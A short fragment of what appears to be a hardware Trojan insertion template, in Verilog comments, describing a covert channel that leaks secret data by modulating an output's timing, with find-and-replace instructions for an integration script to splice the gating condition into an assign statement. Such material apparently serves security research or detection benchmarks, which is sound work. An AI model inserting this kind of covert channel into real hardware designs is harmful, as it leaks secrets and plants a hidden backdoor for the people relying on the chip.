 ...
 * Payload: Modulate timing of out based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of out
//
// Integration Script Must Modify:
//
// IF out is timing-sensitive:
//   Find: assign out = ready_signal;
//   Replace: assign out = (timing_delay == 0) ? ready_signal : 1'b0;
//
